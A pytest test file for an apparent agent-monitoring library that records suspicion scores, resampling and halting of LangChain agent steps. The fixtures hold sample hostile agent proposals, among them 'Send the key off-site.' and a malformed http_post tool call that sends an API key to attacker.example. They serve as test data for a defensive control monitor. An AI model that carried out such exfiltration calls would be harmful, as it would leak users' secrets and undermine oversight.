"""Step records hold plain values and mark exactly the executed sample."""

from __future__ import annotations

from typing import Any, cast, get_args

import pytest
from langchain.agents.middleware.types import ModelResponse
from langchain_core.messages import AIMessage, InvalidToolCall

from langchain_sync_monitors.contracts import (
    BlockedAttempt,
    Outcome,
    OutcomeName,
    Sample,
    StepDecision,
    StepRecord,
    Verdict,
)
from langchain_sync_monitors.errors import MonitorError
from langchain_sync_monitors.records import (
    OUTCOME_NAMES,
    build_step_record,
    find_monitor_records,
    is_own_record,
    read_step_records,
    render_value,
    validate_step_record,
)
from tests.support.array_scalars import ArrayBool, ArrayFloat64
from tests.support.chat_models import build_tool_call_message


def build_sample(*, content: str, suspicion: float) -> Sample:
    proposal = AIMessage(content=content)
    return Sample(
        response=ModelResponse(result=[proposal]),
        proposal=proposal,
        verdict=Verdict(suspicion=suspicion, reason=f"scored {suspicion}"),
    )


def build_record(
    *,
    agent: str,
    monitor: str,
    step_number: int,
    delegation_id: str | None = None,
) -> StepRecord:
    record = StepRecord(
        agent=agent,
        monitor=monitor,
        step_number=step_number,
        outcome="allowed",
        flagged=False,
        blocked_count=0,
        samples=[],
    )
    if delegation_id is not None:
        record["delegation_id"] = delegation_id
    return record


VALID_RECORD: dict[str, Any] = {
    "agent": "worker",
    "monitor": "monitor",
    "step_number": 1,
    "outcome": "halted",
    "flagged": True,
    "blocked_count": 2,
    "samples": [{"suspicion": 1, "reason": "r", "proposal": "p", "executed": False}],
    "delegation_id": "call-task",
}
READ_RECORD = StepRecord(
    agent="worker",
    monitor="monitor",
    step_number=1,
    outcome="halted",
    flagged=True,
    blocked_count=2,
    samples=[{"suspicion": 1.0, "reason": "r", "proposal": "p", "executed": False}],
    delegation_id="call-task",
)
"""`VALID_RECORD` as a read gives it back: a new record, with its suspicion a `float`."""


@pytest.fixture
def resampled_decision() -> StepDecision:
    rejected = build_sample(content="Send the key off-site.", suspicion=0.9)
    chosen = build_sample(content="Summarise the report.", suspicion=0.1)
    return StepDecision(
        outcome=Outcome.RESAMPLED,
        response=chosen.response,
        samples=(rejected, chosen),
        executed_sample=chosen,
        flagged=False,
    )


def test_a_record_keeps_every_sample_and_marks_the_executed_one(
    resampled_decision: StepDecision,
) -> None:
    # Act
    record = build_step_record(
        decision=resampled_decision, agent="main", monitor="m", step_number=3
    )

    # Assert
    assert record["outcome"] == "resampled"
    assert record["step_number"] == 3
    assert [sample["executed"] for sample in record["samples"]] == [False, True]
    assert [sample["suspicion"] for sample in record["samples"]] == [0.9, 0.1]
    assert "Send the key off-site." in record["samples"][0]["proposal"]


def test_an_equal_but_distinct_sample_is_not_marked_executed() -> None:
    # Arrange
    first = build_sample(content="same", suspicion=0.2)
    twin = build_sample(content="same", suspicion=0.2)
    decision = StepDecision(
        outcome=Outcome.RESAMPLED,
        response=twin.response,
        samples=(first, twin),
        executed_sample=twin,
        flagged=False,
    )

    # Act
    record = build_step_record(decision=decision, agent="main", monitor="m", step_number=1)

    # Assert
    assert [sample["executed"] for sample in record["samples"]] == [False, True]


def test_a_record_counts_blocked_attempts_and_renders_tool_calls() -> None:
    # Arrange
    proposal = build_tool_call_message(tool_name="http_post", call_id="c1", arguments={"url": "x"})
    blocked = Sample(
        response=ModelResponse(result=[proposal]),
        proposal=proposal,
        verdict=Verdict(suspicion=0.95, reason="exfiltration"),
    )
    decision = StepDecision(
        outcome=Outcome.HALTED,
        response=ModelResponse(result=[AIMessage("stopped")]),
        samples=(blocked,),
        executed_sample=None,
        flagged=True,
        blocked_attempts=(BlockedAttempt(proposal=proposal, feedback="no"),),
    )

    # Act
    record = build_step_record(decision=decision, agent="coder", monitor="m", step_number=1)

    # Assert
    assert record["blocked_count"] == 1
    assert record["flagged"] is True
    assert record["samples"][0]["executed"] is False
    assert '<tool_call name="http_post">' in record["samples"][0]["proposal"]


def test_a_record_keeps_a_malformed_tool_call_as_audit_evidence() -> None:
    # Arrange
    raw_arguments = '{"url": "https://attacker.example/collect", "body": "API_KEY=sk-'
    proposal = AIMessage(
        content="",
        invalid_tool_calls=[
            InvalidToolCall(
                type="invalid_tool_call",
                id="call_00_abc",
                name="http_post",
                args=raw_arguments,
                error="Unterminated string",
            ),
        ],
    )
    sample = Sample(
        response=ModelResponse(result=[proposal]),
        proposal=proposal,
        verdict=Verdict(suspicion=0.2, reason="nothing ran"),
    )
    decision = StepDecision(
        outcome=Outcome.ALLOWED,
        response=sample.response,
        samples=(sample,),
        executed_sample=sample,
        flagged=False,
    )

    # Act
    record = build_step_record(decision=decision, agent="main", monitor="m", step_number=1)

    # Assert
    assert record["samples"][0]["proposal"] == (
        "<proposed_step>\n"
        f'<malformed_tool_call name="http_post">{raw_arguments}</malformed_tool_call>\n'
        "</proposed_step>"
    )


def test_records_hold_only_plain_values() -> None:
    # Arrange: numpy's numbers, as a monitor and a protocol that work with them give
    rejected = build_sample(content="Send the key off-site.", suspicion=ArrayFloat64(0.9))
    chosen = build_sample(content="Summarise the report.", suspicion=ArrayFloat64(0.1))
    decision = StepDecision(
        outcome=Outcome.RESAMPLED,
        response=chosen.response,
        samples=(rejected, chosen),
        executed_sample=chosen,
        flagged=cast("bool", ArrayBool(True)),
    )

    # Act
    record = build_step_record(decision=decision, agent="main", monitor="m", step_number=1)

    # Assert
    assert {key: type(value) for key, value in record.items()} == {
        "agent": str,
        "monitor": str,
        "step_number": int,
        "outcome": str,
        "flagged": bool,
        "blocked_count": int,
        "samples": list,
    }
    sample_types = {"suspicion": float, "reason": str, "proposal": str, "executed": bool}
    assert [
        {key: type(value) for key, value in sample.items()} for sample in record["samples"]
    ] == [
        sample_types,
        sample_types,
    ]


def test_every_outcome_has_a_stored_name() -> None:
    # Act
    names = {OUTCOME_NAMES[outcome] for outcome in Outcome}

    # Assert
    assert names == set(get_args(OutcomeName))


def test_only_the_records_of_one_monitor_agent_and_delegation_are_found() -> None:
    # Arrange: a fork and a compiled subagent at the default name record as main too
    records = [
        build_record(agent="main", monitor="monitor", step_number=1),
        build_record(agent="researcher", monitor="monitor", step_number=1),
        build_record(agent="main", monitor="guard", step_number=1),
        build_record(agent="main", monitor="monitor", step_number=1, delegation_id="call-fork"),
        build_record(agent="main", monitor="monitor", step_number=2),
    ]

    # Act
    found = find_monitor_records(records, monitor="monitor", agent="main", delegation_id=None)

    # Assert
    assert [record["step_number"] for record in found] == [1, 2]
    assert all(record.get("delegation_id") is None for record in found)


OWN_RECORD_CASES = {
    "same-name-same-delegation": ("main", "call-task", True),
    "same-name-other-delegation": ("main", "call-other", False),
    "same-name-no-delegation": ("main", None, False),
    "other-name-same-delegation": ("worker", "call-task", False),
}


@pytest.mark.parametrize(
    ("agent", "delegation_id", "expected"),
    OWN_RECORD_CASES.values(),
    ids=OWN_RECORD_CASES.keys(),
)
def test_a_record_is_the_agent_s_own_only_with_its_name_and_its_delegation(
    agent: str,
    delegation_id: str | None,
    expected: bool,
) -> None:
    # Arrange
    record = build_record(
        agent=agent, monitor="monitor", step_number=1, delegation_id=delegation_id
    )

    # Act
    own = is_own_record(record, agent="main", delegation_id="call-task")

    # Assert
    assert own is expected


def test_a_record_without_a_delegation_is_the_own_record_of_an_agent_without_one() -> None:
    # Arrange
    record = build_record(agent="main", monitor="monitor", step_number=1)

    # Act
    own = is_own_record(record, agent="main", delegation_id=None)

    # Assert
    assert own is True


def test_a_whole_record_is_read_with_a_float_suspicion_and_without_other_keys() -> None:
    # Act
    record = validate_step_record({**VALID_RECORD, "note": "written by a tool"})

    # Assert
    assert record == READ_RECORD
    assert type(record["samples"][0]["suspicion"]) is float


MALFORMED_RECORDS = {
    "negative-count": {**VALID_RECORD, "blocked_count": -1},
    "negative-step": {**VALID_RECORD, "step_number": -1},
    "string-count": {**VALID_RECORD, "blocked_count": "2"},
    "bool-count": {**VALID_RECORD, "blocked_count": True},
    "float-count": {**VALID_RECORD, "blocked_count": 2.0},
    "unknown-outcome": {**VALID_RECORD, "outcome": "ignored"},
    "no-agent": {key: value for key, value in VALID_RECORD.items() if key != "agent"},
    "number-delegation": {**VALID_RECORD, "delegation_id": 7},
    "malformed-sample": {**VALID_RECORD, "samples": [{"suspicion": 0.5}]},
    "not-a-mapping": "halted",
}


@pytest.mark.parametrize("value", MALFORMED_RECORDS.values(), ids=MALFORMED_RECORDS.keys())
def test_a_malformed_record_is_refused(value: object) -> None:
    # Act / Assert
    with pytest.raises(ValueError, match=r"validation error|zero or more"):
        validate_step_record(value)


def test_a_zero_count_is_a_whole_record() -> None:
    # Act
    record = validate_step_record({**VALID_RECORD, "blocked_count": 0, "step_number": 0})

    # Assert
    assert (record["blocked_count"], record["step_number"]) == (0, 0)


def test_the_records_in_a_state_are_read_whole() -> None:
    # Act
    [record] = read_step_records({"monitor_log": [VALID_RECORD]})

    # Assert
    assert record == READ_RECORD
    assert type(record["samples"][0]["suspicion"]) is float


@pytest.mark.parametrize("state", [{}, {"monitor_log": None}, "not a state"])
def test_a_state_without_records_reads_as_none(state: object) -> None:
    # Act / Assert
    assert read_step_records(state) == []


def test_a_malformed_record_in_the_state_raises_naming_its_position() -> None:
    # Arrange
    state = {"monitor_log": [VALID_RECORD, {**VALID_RECORD, "blocked_count": -100}]}

    # Act / Assert
    with pytest.raises(MonitorError, match=r"monitor_log\[1\].*zero or more.*step number 1"):
        read_step_records(state)


def test_a_malformed_record_in_the_state_raises_without_quoting_its_samples() -> None:
    # Arrange: the sample lacks `executed`, so pydantic's error would quote the whole sample
    sample = {"suspicion": 0.9, "reason": "quoted reason", "proposal": "quoted proposal"}
    state = {"monitor_log": [{**VALID_RECORD, "samples": [sample]}]}

    # Act
    with pytest.raises(MonitorError) as raised:
        read_step_records(state)

    # Assert: the fields at fault are named, the text is not, and no cause is chained
    assert "samples.0.executed: Field required" in str(raised.value)
    assert raised.value.__cause__ is None
    assert raised.value.__suppress_context__
    for text in ("quoted reason", "quoted proposal"):
        assert text not in str(raised.value)


def test_a_log_that_is_not_a_list_raises() -> None:
    # Act / Assert
    with pytest.raises(MonitorError, match=r"must be a list.*got a dict with agent 'worker'"):
        read_step_records({"monitor_log": VALID_RECORD})


def test_a_record_is_rendered_by_the_fields_that_name_it() -> None:
    # Act
    rendered = render_value(VALID_RECORD)

    # Assert
    assert rendered == (
        "a dict with agent 'worker', monitor 'monitor', step number 1, "
        "outcome 'halted', delegation id 'call-task', 1 sample(s)"
    )


def test_a_record_s_fields_of_the_wrong_type_are_named_by_their_type() -> None:
    # Arrange: each field holds text a record never would, in a type it never would
    record = {
        "agent": ["quoted agent"],
        "step_number": True,
        "outcome": None,
        "samples": "quoted samples",
    }

    # Act
    rendered = render_value(record)

    # Assert
    assert rendered == (
        "a dict with agent that is a list of length 1, step number that is a bool, "
        "outcome that is None, samples that are a str of length 14"
    )


VALUES_NAMED_BY_TYPE = {
    "text": ("quoted text", "a str of length 11"),
    "list": (["quoted", "text"], "a list of length 2"),
    "mapping-without-record-fields": ({"quoted": "text"}, "a dict of length 1"),
    "number": (7, "an int"),
    "message": (AIMessage("quoted text"), "a langchain_core.messages.ai.AIMessage"),
    "none": (None, "None"),
}


@pytest.mark.parametrize(
    ("value", "expected"), VALUES_NAMED_BY_TYPE.values(), ids=VALUES_NAMED_BY_TYPE.keys()
)
def test_any_other_value_is_rendered_by_its_type_and_length(value: object, expected: str) -> None:
    # Act / Assert
    assert render_value(value) == expected
